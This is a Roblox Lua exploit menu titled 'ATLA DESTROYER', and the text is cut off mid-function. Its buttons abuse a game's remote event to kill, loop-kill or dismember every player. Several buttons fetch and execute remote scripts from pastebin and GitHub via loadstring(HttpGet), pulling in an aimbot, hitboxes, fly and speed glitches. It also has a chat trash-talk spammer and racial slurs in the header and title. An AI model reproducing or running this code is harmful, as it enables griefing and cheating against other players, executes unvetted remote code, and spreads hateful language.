-- BY SOULSLASHER NIGGAS^K
local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Deltool = Instance.new("TextButton")
local Killall = Instance.new("TextButton")
local Delbodyall = Instance.new("TextButton")
local InvsGUI = Instance.new("TextButton")
local Servercrash = Instance.new("TextButton")
local Loopkillall = Instance.new("TextButton")
local Hitboxgui = Instance.new("TextButton")
local infstam = Instance.new("TextButton")
local GodsSL2Killer = Instance.new("TextButton")
local Trashtalk = Instance.new("TextButton")
local antilag = Instance.new("TextButton")
local TeaHub = Instance.new("TextButton")
local ServerHop = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderColor3 = Color3.fromRGB(255, 3, 7)
Main.BorderSizePixel = 4
Main.Position = UDim2.new(0.277276456, 0, 0.29048413, 0)
Main.Size = UDim2.new(0, 684, 0, 272)
Main.Active = true
Main.Draggable = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.BorderSizePixel = 4
TextLabel.Position = UDim2.new(0.00584795326, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 676, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "ATLA DESTROYER BY CAPS SOULSLASHER^K - GONNA FUCK YOUR GAME UP NIGGER"
TextLabel.TextColor3 = Color3.fromRGB(255, 7, 7)
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)

Deltool.Name = "Del tool"
Deltool.Parent = Main
Deltool.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Deltool.BorderColor3 = Color3.fromRGB(255, 0, 0)
Deltool.BorderSizePixel = 4
Deltool.Position = UDim2.new(0.00504177809, 0, 0.00688524917, 0)
Deltool.Size = UDim2.new(0, 103, 0, 48)
Deltool.Font = Enum.Font.SourceSansBold
Deltool.Text = "DESTROY TOOL"
Deltool.TextColor3 = Color3.fromRGB(255, 247, 0)
Deltool.TextSize = 15.000
Deltool.MouseButton1Down:connect(function()
	_G.SHOW_RED_BOXES = false -- Set this to 'false' if you dont want the red boxes to show (less lag)

	loadstring(game:HttpGet("https://pastebin.com/raw/qrk8BkEY"))()
end)

Killall.Name = "Kill all"
Killall.Parent = Main
Killall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Killall.BorderColor3 = Color3.fromRGB(255, 0, 0)
Killall.BorderSizePixel = 4
Killall.Position = UDim2.new(-0.000665307045, 0, 0.723797143, 0)
Killall.Size = UDim2.new(0, 187, 0, 33)
Killall.Font = Enum.Font.SourceSansBold
Killall.Text = "Kill All"
Killall.TextColor3 = Color3.fromRGB(255, 0, 0)
Killall.TextSize = 22.000
Killall.MouseButton1Down:connect(function()
	for _,v in pairs(game.Players:GetChildren()) do
		local args = {
			[1] = "ProcessKey",
			[2] = {
				["Key"] = "K",
				["RIP"] =  {Parent = v.Character, Value = 0},
			},
		}
		game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
		wait()
	end
end)

Delbodyall.Name = "Del body all"
Delbodyall.Parent = Main
Delbodyall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Delbodyall.BorderColor3 = Color3.fromRGB(255, 0, 0)
Delbodyall.BorderSizePixel = 4
Delbodyall.Position = UDim2.new(0.589705884, 0, 0.721847296, 0)
Delbodyall.Size = UDim2.new(0, 187, 0, 33)
Delbodyall.Font = Enum.Font.SourceSansBold
Delbodyall.Text = "Delete Body All"
Delbodyall.TextColor3 = Color3.fromRGB(255, 0, 0)
Delbodyall.TextSize = 22.000
Delbodyall.MouseButton1Down:connect(function()
	local parts = {"RightUpperLeg", "RightUpperArm", "LeftUpperLeg", "LeftUpperArm"}

	for _,player in pairs(game:GetService("Players"):GetChildren()) do
		for _,v in pairs(parts) do 
			local args = {
				[1] = "ProcessKey",
				[2] = {
					["Key"] = "K",
					["RIP"] =  {Parent = player.Character[v], Value = 0},
				},
			}
			game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))

		end
	end
end)

InvsGUI.Name = "Invs GUI"
InvsGUI.Parent = Main
InvsGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
InvsGUI.BorderColor3 = Color3.fromRGB(255, 0, 0)
InvsGUI.BorderSizePixel = 4
InvsGUI.Position = UDim2.new(0.590511203, 0, 0.210817814, 0)
InvsGUI.Size = UDim2.new(0, 187, 0, 33)
InvsGUI.Font = Enum.Font.SourceSansBold
InvsGUI.Text = "Invisible GUI"
InvsGUI.TextColor3 = Color3.fromRGB(255, 0, 0)
InvsGUI.TextSize = 22.000
InvsGUI.MouseButton1Down:connect(function()
	local GUI = Instance.new("ScreenGui")
	local Main = Instance.new("Frame")
	local Topbar = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local Exit = Instance.new("TextButton")
	local Minimize = Instance.new("TextButton")
	local SubFrame = Instance.new("Frame")
	local AirTP = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel_2 = Instance.new("TextLabel")
	local BoolToggle = Instance.new("TextButton")
	local AutoRun = Instance.new("Frame")
	local TextLabel_3 = Instance.new("TextLabel")
	local TextLabel_4 = Instance.new("TextLabel")
	local BoolToggle_2 = Instance.new("TextButton")
	local Keybind = Instance.new("Frame")
	local TextLabel_5 = Instance.new("TextLabel")
	local TextLabel_6 = Instance.new("TextLabel")
	local CurrentBind = Instance.new("TextBox")
	local QuickInvis = Instance.new("TextButton")
	local Rigtype = Instance.new("TextLabel")
	local TextButton = Instance.new("TextButton")

	-- Properties

	GUI.Name = "GUI"
	GUI.Parent = game.CoreGui

	Main.Name = "Main"
	Main.Parent = GUI
	Main.Active = true
	Main.BackgroundColor3 = Color3.new(0, 0, 0)
	Main.BackgroundTransparency = 0.5
	Main.BorderSizePixel = 0
	Main.Draggable = true
	Main.Position = UDim2.new(0.318181813, 0, 0.312252969, 0)
	Main.Size = UDim2.new(0.363636374, 0, 0.375494063, 0)

	Topbar.Name = "Topbar"
	Topbar.Parent = Main
	Topbar.BackgroundColor3 = Color3.new(0, 0, 0)
	Topbar.BackgroundTransparency = 0.9990000128746
	Topbar.Size = UDim2.new(1, 0, 0.163157895, 0)

	Title.Name = "Title"
	Title.Parent = Topbar
	Title.BackgroundColor3 = Color3.new(0, 0, 0)
	Title.BackgroundTransparency = 0.9990000128746
	Title.Size = UDim2.new(0.784722209, 0, 1, 0)
	Title.Font = Enum.Font.SciFi
	Title.FontSize = Enum.FontSize.Size14
	Title.Text = "FE Invisible By Timeless"
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.TextSize = 14

	Exit.Name = "Exit"
	Exit.Parent = Topbar
	Exit.BackgroundColor3 = Color3.new(0, 0, 0)
	Exit.BackgroundTransparency = 0.9990000128746
	Exit.Position = UDim2.new(0.892361104, 0, 0, 0)
	Exit.Size = UDim2.new(0.107638888, 0, 1, 0)
	Exit.Font = Enum.Font.SciFi
	Exit.FontSize = Enum.FontSize.Size14
	Exit.Text = "X"
	Exit.TextColor3 = Color3.new(1, 1, 1)
	Exit.TextSize = 14

	Minimize.Name = "Minimize"
	Minimize.Parent = Topbar
	Minimize.BackgroundColor3 = Color3.new(0, 0, 0)
	Minimize.BackgroundTransparency = 0.9990000128746
	Minimize.Position = UDim2.new(0.784722209, 0, 0, 0)
	Minimize.Size = UDim2.new(0.107638888, 0, 1, 0)
	Minimize.Font = Enum.Font.SciFi
	Minimize.FontSize = Enum.FontSize.Size14
	Minimize.Text = "-"
	Minimize.TextColor3 = Color3.new(1, 1, 1)
	Minimize.TextSize = 14

	SubFrame.Name = "SubFrame"
	SubFrame.Parent = Main
	SubFrame.BackgroundColor3 = Color3.new(0, 0, 0)
	SubFrame.BackgroundTransparency = 0.5
	SubFrame.BorderSizePixel = 0
	SubFrame.Position = UDim2.new(0, 0, 0.163157895, 0)
	SubFrame.Size = UDim2.new(1, 0, 0.83684212, 0)

	AirTP.Name = "AirTP"
	AirTP.Parent = SubFrame
	AirTP.BackgroundColor3 = Color3.new(0, 0, 0)
	AirTP.BackgroundTransparency = 0.9990000128746
	AirTP.BorderSizePixel = 0
	AirTP.Position = UDim2.new(0, 0, 0.0628930852, 0)
	AirTP.Size = UDim2.new(1, 0, 0.176100627, 0)

	TextLabel.Parent = AirTP
	TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel.BackgroundTransparency = 0.9990000128746
	TextLabel.Position = UDim2.new(0.166666672, 0, 0, 0)
	TextLabel.Size = UDim2.new(0.284722209, 0, 1, 0)
	TextLabel.Font = Enum.Font.SciFi
	TextLabel.FontSize = Enum.FontSize.Size14
	TextLabel.Text = "Air TP"
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextSize = 14
	TextLabel.TextXAlignment = Enum.TextXAlignment.Left

	TextLabel_2.Parent = AirTP
	TextLabel_2.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel_2.BackgroundTransparency = 0.9990000128746
	TextLabel_2.Position = UDim2.new(0.451388896, 0, 0, 0)
	TextLabel_2.Size = UDim2.new(0.0972222239, 0, 1, 0)
	TextLabel_2.Font = Enum.Font.SciFi
	TextLabel_2.FontSize = Enum.FontSize.Size14
	TextLabel_2.Text = "-"
	TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_2.TextSize = 14

	BoolToggle.Name = "BoolToggle"
	BoolToggle.Parent = AirTP
	BoolToggle.BackgroundColor3 = Color3.new(0.207843, 1, 0.392157)
	BoolToggle.BackgroundTransparency = 0.5
	BoolToggle.BorderSizePixel = 0
	BoolToggle.Position = UDim2.new(0.784722209, 0, 0, 0)
	BoolToggle.Size = UDim2.new(0.215277776, 0, 1, 0)
	BoolToggle.Font = Enum.Font.SciFi
	BoolToggle.FontSize = Enum.FontSize.Size14
	BoolToggle.Text = "true"
	BoolToggle.TextColor3 = Color3.new(1, 1, 1)
	BoolToggle.TextSize = 14

	AutoRun.Name = "AutoRun"
	AutoRun.Parent = SubFrame
	AutoRun.BackgroundColor3 = Color3.new(0, 0, 0)
	AutoRun.BackgroundTransparency = 0.9990000128746
	AutoRun.Position = UDim2.new(0, 0, 0.238993704, 0)
	AutoRun.Size = UDim2.new(1, 0, 0.176100627, 0)

	TextLabel_3.Parent = AutoRun
	TextLabel_3.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel_3.BackgroundTransparency = 0.9990000128746
	TextLabel_3.Position = UDim2.new(0.166666672, 0, 0, 0)
	TextLabel_3.Size = UDim2.new(0.284722209, 0, 1, 0)
	TextLabel_3.Font = Enum.Font.SciFi
	TextLabel_3.FontSize = Enum.FontSize.Size14
	TextLabel_3.Text = "Auto Run"
	TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_3.TextSize = 14
	TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

	TextLabel_4.Parent = AutoRun
	TextLabel_4.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel_4.BackgroundTransparency = 0.9990000128746
	TextLabel_4.Position = UDim2.new(0.451388896, 0, 0, 0)
	TextLabel_4.Size = UDim2.new(0.0972222239, 0, 1, 0)
	TextLabel_4.Font = Enum.Font.SciFi
	TextLabel_4.FontSize = Enum.FontSize.Size14
	TextLabel_4.Text = "-"
	TextLabel_4.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_4.TextSize = 14

	BoolToggle_2.Name = "BoolToggle"
	BoolToggle_2.Parent = AutoRun
	BoolToggle_2.BackgroundColor3 = Color3.new(0.207843, 1, 0.392157)
	BoolToggle_2.BackgroundTransparency = 0.5
	BoolToggle_2.BorderSizePixel = 0
	BoolToggle_2.Position = UDim2.new(0.784722209, 0, 0, 0)
	BoolToggle_2.Size = UDim2.new(0.215277776, 0, 1, 0)
	BoolToggle_2.Font = Enum.Font.SciFi
	BoolToggle_2.FontSize = Enum.FontSize.Size14
	BoolToggle_2.Text = "true"
	BoolToggle_2.TextColor3 = Color3.new(1, 1, 1)
	BoolToggle_2.TextSize = 14

	Keybind.Name = "Keybind"
	Keybind.Parent = SubFrame
	Keybind.BackgroundColor3 = Color3.new(0, 0, 0)
	Keybind.BackgroundTransparency = 0.9990000128746
	Keybind.Position = UDim2.new(0, 0, 0.415094346, 0)
	Keybind.Size = UDim2.new(1, 0, 0.176100627, 0)

	TextLabel_5.Parent = Keybind
	TextLabel_5.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel_5.BackgroundTransparency = 0.9990000128746
	TextLabel_5.Position = UDim2.new(0.166666672, 0, 0, 0)
	TextLabel_5.Size = UDim2.new(0.284722209, 0, 1, 0)
	TextLabel_5.Font = Enum.Font.SciFi
	TextLabel_5.FontSize = Enum.FontSize.Size14
	TextLabel_5.Text = "Keybind"
	TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_5.TextSize = 14
	TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

	TextLabel_6.Parent = Keybind
	TextLabel_6.BackgroundColor3 = Color3.new(0, 0, 0)
	TextLabel_6.BackgroundTransparency = 0.9990000128746
	TextLabel_6.Position = UDim2.new(0.451388896, 0, 0, 0)
	TextLabel_6.Size = UDim2.new(0.0972222239, 0, 1, 0)
	TextLabel_6.Font = Enum.Font.SciFi
	TextLabel_6.FontSize = Enum.FontSize.Size14
	TextLabel_6.Text = "-"
	TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
	TextLabel_6.TextSize = 14

	CurrentBind.Name = "CurrentBind"
	CurrentBind.Parent = Keybind
	CurrentBind.BackgroundColor3 = Color3.new(0.262745, 0.964706, 1)
	CurrentBind.BackgroundTransparency = 0.5
	CurrentBind.BorderSizePixel = 0
	CurrentBind.Position = UDim2.new(0.784722209, 0, 0, 0)
	CurrentBind.Size = UDim2.new(0.215277776, 0, 1, 0)
	CurrentBind.Font = Enum.Font.SciFi
	CurrentBind.FontSize = Enum.FontSize.Size14
	CurrentBind.Text = "i"
	CurrentBind.TextColor3 = Color3.new(1, 1, 1)
	CurrentBind.TextSize = 14

	QuickInvis.Name = "QuickInvis"
	QuickInvis.Parent = SubFrame
	QuickInvis.BackgroundColor3 = Color3.new(1, 0.227451, 0.227451)
	QuickInvis.BackgroundTransparency = 0.5
	QuickInvis.BorderSizePixel = 0
	QuickInvis.Position = UDim2.new(0, 0, 0.823899388, 0)
	QuickInvis.Size = UDim2.new(1, 0, 0.176100627, 0)
	QuickInvis.Font = Enum.Font.SciFi
	QuickInvis.FontSize = Enum.FontSize.Size14
	QuickInvis.Text = "Go Invisible"
	QuickInvis.TextColor3 = Color3.new(1, 1, 1)
	QuickInvis.TextSize = 14

	Rigtype.Name = "Rigtype"
	Rigtype.Parent = SubFrame
	Rigtype.BackgroundColor3 = Color3.new(0, 0, 0)
	Rigtype.BackgroundTransparency = 0.69999998807907
	Rigtype.BorderSizePixel = 0
	Rigtype.Position = UDim2.new(0, 0, 0.647798777, 0)
	Rigtype.Size = UDim2.new(1, 0, 0.176100627, 0)
	Rigtype.Font = Enum.Font.SciFi
	Rigtype.FontSize = Enum.FontSize.Size14
	Rigtype.Text = "Your Rigtype - RigTypeHere"
	Rigtype.TextColor3 = Color3.new(1, 1, 1)
	Rigtype.TextSize = 14

	TextButton.Parent = GUI
	TextButton.BackgroundColor3 = Color3.new(0, 0, 0)
	TextButton.BackgroundTransparency = 0.5
	TextButton.BorderSizePixel = 0
	TextButton.Position = UDim2.new(0.0265151523, 0, 0.865612626, 0)
	TextButton.Size = UDim2.new(0.0606060624, 0, 0.0948616564, 0)
	TextButton.Font = Enum.Font.SciFi
	TextButton.FontSize = Enum.FontSize.Size14
	TextButton.Text = "Open"
	TextButton.TextColor3 = Color3.new(1, 1, 1)
	TextButton.TextSize = 14

	local Player   = game:GetService('Players').LocalPlayer
	local Mouse    = Player:GetMouse()

	local AutoRun  = true
	local AirTP    = true
	local Keybind  = 'i'

	local Green    = Color3.fromRGB(53, 255, 100)
	local Red      = Color3.fromRGB(255, 58, 58)

	local function CheckRig()
		if Player.Character then
			local Humanoid = Player.Character:WaitForChild('Humanoid')
			if Humanoid.RigType == Enum.HumanoidRigType.R15 then
				return 'R15'
			else
				return 'R6'
			end
		end
	end

	local function InitiateInvis()
		local Character = Player.Character
		local StoredCF = Character.PrimaryPart.CFrame
		if AirTP then
			local Part = Instance.new('Part',workspace)
			Part.Size = Vector3.new(5,0,5)
			Part.Anchored = true
			Part.CFrame = CFrame.new(Vector3.new(9999,9999,9999))
			Character.PrimaryPart.CFrame = Part.CFrame*CFrame.new(0,3,0)
			spawn(function()
				wait(3)
				Part:Destroy()
			end)
		end
		if CheckRig() == 'R6' then
			local Clone = Character.HumanoidRootPart:Clone()
			Character.HumanoidRootPart:Destroy()
			Clone.Parent = Character
		else
			local Clone = Character.LowerTorso.Root:Clone()
			Character.LowerTorso.Root:Destroy()
			Clone.Parent = Character.LowerTorso
		end
		if AirTP then
			wait(1)
			Character.PrimaryPart.CFrame = StoredCF
		end
	end

	local function OnCharacterAdded()
		SubFrame.Rigtype.Text = ('Your Rigtype - %s'):format(CheckRig())
		if AutoRun then
			InitiateInvis()
		end
	end

	local function OnButtonPress(Button)
		if Button == Keybind:lower() then
			InitiateInvis()
		end
	end

	local function OnGoInvisPress()
		InitiateInvis()
	end

	local function OnKeyBindTextChange()
		local cb = SubFrame.Keybind.CurrentBind
		if cb.Text:match('%w') then
			Keybind = cb.Text:match('%w'):lower()
			cb.Text = Keybind
		elseif cb.Text ~= '' then
			Keybind = 'i'
			cb.Text = Keybind
		end
		print(Keybind)
	end

	local function OnAutoRunPress()
		local Ar = SubFrame.AutoRun.BoolToggle
		if AutoRun then
			Ar.BackgroundColor3 = Red
			Ar.Text = tostring(not AutoRun)
			AutoRun = false
		else
			Ar.BackgroundColor3 = Green
			Ar.Text = tostring(not AutoRun)
			AutoRun = true
		end
	end

	local function OnAirTPPress()
		local ATP = SubFrame.AirTP.BoolToggle
		if AirTP then
			ATP.BackgroundColor3 = Red
			ATP.Text = tostring(false)
			AirTP = false
		else
			ATP.BackgroundColor3 = Green
			ATP.Text = tostring(true)
			AirTP = true
		end
	end

	local function OnMinimizePress()
		Main.Visible = false
		GUI.TextButton.Visible = true
	end

	local function OnOpenPress()
		Main.Visible = true
		GUI.TextButton.Visible = false
	end

	local function OnClosePress()
		GUI:Destroy()
	end

	SubFrame.Keybind.CurrentBind:GetPropertyChangedSignal('Text'):connect(OnKeyBindTextChange)
	Mouse.KeyDown:connect(OnButtonPress)
	SubFrame.AutoRun.BoolToggle.MouseButton1Down:connect(OnAutoRunPress)
	SubFrame.AirTP.BoolToggle.MouseButton1Down:connect(OnAirTPPress)
	Main.Topbar.Minimize.MouseButton1Down:connect(OnMinimizePress)
	GUI.TextButton.MouseButton1Down:connect(OnOpenPress)
	Main.Topbar.Exit.MouseButton1Down:connect(OnClosePress)
	SubFrame.QuickInvis.MouseButton1Down:connect(OnGoInvisPress)
	Player.CharacterAdded:connect(OnCharacterAdded)

	SubFrame.Rigtype.Text = ('Your Rigtype - %s'):format(CheckRig())
end)

Servercrash.Name = "Servercrash"
Servercrash.Parent = Main
Servercrash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Servercrash.BorderColor3 = Color3.fromRGB(255, 0, 0)
Servercrash.BorderSizePixel = 4
Servercrash.Position = UDim2.new(0.589705825, 0, 0.3782233, 0)
Servercrash.Size = UDim2.new(0, 187, 0, 33)
Servercrash.Font = Enum.Font.SourceSansBold
Servercrash.Text = "Glitch All"
Servercrash.TextColor3 = Color3.fromRGB(255, 0, 0)
Servercrash.TextSize = 22.000
Servercrash.MouseButton1Down:connect(function()
Servercrash.MouseButton1Down:connect(function()
		
			local parts = {"LowerTorso"}

			for _,player in pairs(game:GetService("Players"):GetChildren()) do
				for _,v in pairs(parts) do 
					local args = {
						[1] = "ProcessKey",
						[2] = {
							["Key"] = "K",
							["RIP"] =  {Parent = player.Character[v], Value = 0},
						},
					}
					game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))

				end
			end
	end)
end)

Loopkillall.Name = "Loop kill all"
Loopkillall.Parent = Main
Loopkillall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Loopkillall.BorderColor3 = Color3.fromRGB(255, 0, 0)
Loopkillall.BorderSizePixel = 4
Loopkillall.Position = UDim2.new(0.590511143, 0, 0.554693818, 0)
Loopkillall.Size = UDim2.new(0, 187, 0, 33)
Loopkillall.Font = Enum.Font.SourceSansBold
Loopkillall.Text = "Loop Kill All"
Loopkillall.TextColor3 = Color3.fromRGB(255, 0, 0)
Loopkillall.TextSize = 22.000
Loopkillall.MouseButton1Down:connect(function()
	_G.loop = true
	while _G.loop do
		for _,v in pairs(game.Players:GetChildren()) do
			local args = {
				[1] = "ProcessKey",
				[2] = {
					["Key"] = "K",
					["RIP"] =  {Parent = v.Character, Value = 0},
				},
			}
			game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
			wait()
		end
	end;
end)

Hitboxgui.Name = "Hitbox gui"
Hitboxgui.Parent = Main
Hitboxgui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Hitboxgui.BorderColor3 = Color3.fromRGB(255, 0, 0)
Hitboxgui.BorderSizePixel = 4
Hitboxgui.Position = UDim2.new(0.295588225, 0, 0.210127115, 0)
Hitboxgui.Size = UDim2.new(0, 187, 0, 33)
Hitboxgui.Font = Enum.Font.SourceSansBold
Hitboxgui.Text = "HitBox GUI"
Hitboxgui.TextColor3 = Color3.fromRGB(255, 0, 0)
Hitboxgui.TextSize = 22.000
Hitboxgui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/shit%20script%20pack/CheatX'))()
end)

infstam.Name = "inf stam"
infstam.Parent = Main
infstam.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
infstam.BorderColor3 = Color3.fromRGB(255, 0, 0)
infstam.BorderSizePixel = 4
infstam.Position = UDim2.new(0.294922948, 0, 0.381201804, 0)
infstam.Size = UDim2.new(0, 187, 0, 33)
infstam.Font = Enum.Font.SourceSansBold
infstam.Text = "INF Stamina"
infstam.TextColor3 = Color3.fromRGB(255, 0, 0)
infstam.TextSize = 22.000
infstam.MouseButton1Down:connect(function()
	local stam = game:GetService("Players").LocalPlayer.PlayerData.Stats.Stamina
	stam.Value = 400
end)

GodsSL2Killer.Name = "Gods SL2 Killer"
GodsSL2Killer.Parent = Main
GodsSL2Killer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GodsSL2Killer.BorderColor3 = Color3.fromRGB(255, 0, 0)
GodsSL2Killer.BorderSizePixel = 4
GodsSL2Killer.Position = UDim2.new(0, 0, 0.38441053, 0)
GodsSL2Killer.Size = UDim2.new(0, 187, 0, 33)
GodsSL2Killer.Font = Enum.Font.SourceSansBold
GodsSL2Killer.Text = "Aimbot"
GodsSL2Killer.TextColor3 = Color3.fromRGB(255, 0, 0)
GodsSL2Killer.TextSize = 22.000
GodsSL2Killer.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/tututu1mn13/SL2Killerr/main/script.lua'))()
end)

Trashtalk.Name = "Trash talk"
Trashtalk.Parent = Main
Trashtalk.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Trashtalk.BorderColor3 = Color3.fromRGB(255, 0, 0)
Trashtalk.BorderSizePixel = 4
Trashtalk.Position = UDim2.new(-0.000665305648, 0, 0.557204723, 0)
Trashtalk.Size = UDim2.new(0, 187, 0, 33)
Trashtalk.Font = Enum.Font.SourceSansBold
Trashtalk.Text = "Trash Talk"
Trashtalk.TextColor3 = Color3.fromRGB(255, 0, 0)
Trashtalk.TextSize = 22.000
Trashtalk.MouseButton1Down:connect(function()
	local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua"))()


	local Window = Library:Create("PickleAssist",".gg/1ov")

	local Tab1 = Window:Tab("Aiming",true)

	Tab1:Toggle("Toggle Silent Aim",function(bool)
		DaHoodSettings.SilentAim = bool
	end)

	Tab1:Toggle("Toggle FOV",function(bool)
		Aiming.ShowFOV = bool
	end)

	Tab1:Toggle("Toggle Visiblility Check",function(bool)
		Aiming.VisibleCheck = bool
	end)

	Tab1:Slider("FOV Size",0,200,function(bool)
		Aiming.FOV = bool
	end)

	Tab1:Textbox("Prediction 0.165-0.235","0.157",function(bool)
		DaHoodSettings.Prediction = bool
	end)

	Tab1:Dropdown("Silent Aim Part",{"Head","HumanoidRootPart","UpperTorso"},function(value)
		Aiming.AimPart = value
	end)

	local Tab2 = Window:Tab("Player",false)

	Tab2:Label("Player Scripts")

	game.StarterGui:SetCore("SendNotification", {
		Title = "PickleAssist";
		Text = "You're Whitelisted";
		Icon = "RBXID OR BLANK";
		Duration = "DURATION IN SECONDS";
		callbakc = bindableFunction;
		Button1 = "Okay";
	})

	Tab2:Button("Speed Glitch (Q)",function(bool)
		loadstring(game:HttpGet("https://pastebin.com/raw/QW5Whap9"))()
	end)

	Tab2:Button("Realistic Speed Glitch (X)",function(bool)
		local Player = game:GetService("Players").LocalPlayer
		local Mouse = Player:GetMouse()
		local SpeedGlitch = false
		local Wallet = Player.Backpack:FindFirstChild("Wallet")

		local UniversalAnimation = Instance.new("Animation")

		function stopTracks()
			for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
				if (v.Animation.AnimationId:match("rbxassetid")) then
					v:Stop()
				end
			end
		end

		function loadAnimation(id)
			if UniversalAnimation.AnimationId == id then
				stopTracks()
				UniversalAnimation.AnimationId = "1"
			else
				UniversalAnimation.AnimationId = id
				local animationTrack = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
				animationTrack:Play()
			end
		end

		Mouse.KeyDown:Connect(function(Key)
			if Key == "x" then
				SpeedGlitch = not SpeedGlitch
				if SpeedGlitch == true then
					stopTracks()
					loadAnimation("rbxassetid://3189777795")
					wait(1.5)
					Wallet.Parent = Player.Character
					wait(0.15)
					Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
					wait(0.05)
					repeat game:GetService("RunService").Heartbeat:wait()
						keypress(0x49)
						game:GetService("RunService").Heartbeat:wait()
						keypress(0x4F)
						game:GetService("RunService").Heartbeat:wait()
						keyrelease(0x49)
						game:GetService("RunService").Heartbeat:wait()
						keyrelease(0x4F)
						game:GetService("RunService").Heartbeat:wait()
					until SpeedGlitch == false
				end
			end
		end)
	end)

	Tab2:Button("FLY (X)",function(bool)
		loadstring(game:HttpGet("https://pastebin.com/raw/sUA9m6M6"))()
	end)

	Tab2:Slider("Fov Camera",80,200,function(text)
		workspace.CurrentCamera.FieldOfView = (text)
	end)

	Tab2:Button("Headless Client Sided",function(bool)
		getgenv().game.Players.LocalPlayer.Character.Head.Transparency = 1
		getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
		getgenv().game.Players.LocalPlayer.Character.Head.face:Destroy()
	end)

	Tab2:Button("Korblox Client Sided",function(bool)
		local ply = game.Players.LocalPlayer
		local chr = ply.Character
		chr.RightLowerLeg.MeshId = "902942093"
		chr.RightLowerLeg.Transparency = "1"
		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
		chr.RightFoot.MeshId = "902942089"
		chr.RightFoot.Transparency = "1"
	end)

	Tab2:Button("Trash Talk (J)",function(bool)
		local plr = game.Players.LocalPlayer
		repeat wait() until plr.Character
		local char = plr.Character

		local garbage = {
			"ur bad";
			"sonney boy";
			"ez";
			"my grandma has more skill than you";
			"seed";
			"sit son";
			"trash";
			"LOL";
			"LMAO";
			"imagine being you right now";
			"xd";
			"don't try LOL";
			"you lose";
			"why do you even try";
			"I didn't think being this bad was possible";
			"leave";
			"no skill";
			"so sad man.";
			"bad";
			"you're nothing";
			"lol";
			"so trash";
			"so bad";
			"ur salty";
			"salty";
			"look he's mad";
			"cry more";
			"keep crying";
			"cry baby";
			"hahaha I won";
			"no one likes u";
			"run 1s seed";
			"thank you for your time";
			"you were so close!";
			"better luck next time!";
			"rodent";
			"HAHA";
			"ill 5-0";
			"just quit";
			"time to take out the trash";
			"did you get worse?";
			"I'm surprised you haven't quit yet";











		}


		function TrashTalk(inputObject, gameProcessedEvent)
			if inputObject.KeyCode == Enum.KeyCode.J and gameProcessedEvent == false then        
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
					garbage[math.random(1,#garbage)],
					"All"
				)
			end
		end

		game:GetService("UserInputService").InputBegan:connect(TrashTalk)
	end)

	local Tab3 = Window:Tab("Anti-Lock",false)

	Tab3:Label("Anti-Lock")

	local triggerbotEnable = Tab3:Button("Trigger Bot (BETA Cant turn off btw)", function(state)
		local player = game.Players.LocalPlayer
		local mouse = player:GetMouse()
		local Players = game:FindService("Players")

		if state == true then
			repeat wait()
				local target = mouse.Target	
				if target then
					if target.Parent:IsA("Model") then
						for i,v in pairs(Players:GetChildren()) do
							if v.Name == target.Parent.Name or v.Name == target.Parent.Parent.Name then
								mouse1click()
							end
						end
					end
				end
			until state == false
		end
	end)

	Tab3:Button("FIX ANTILOCK",function(bool)

		for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
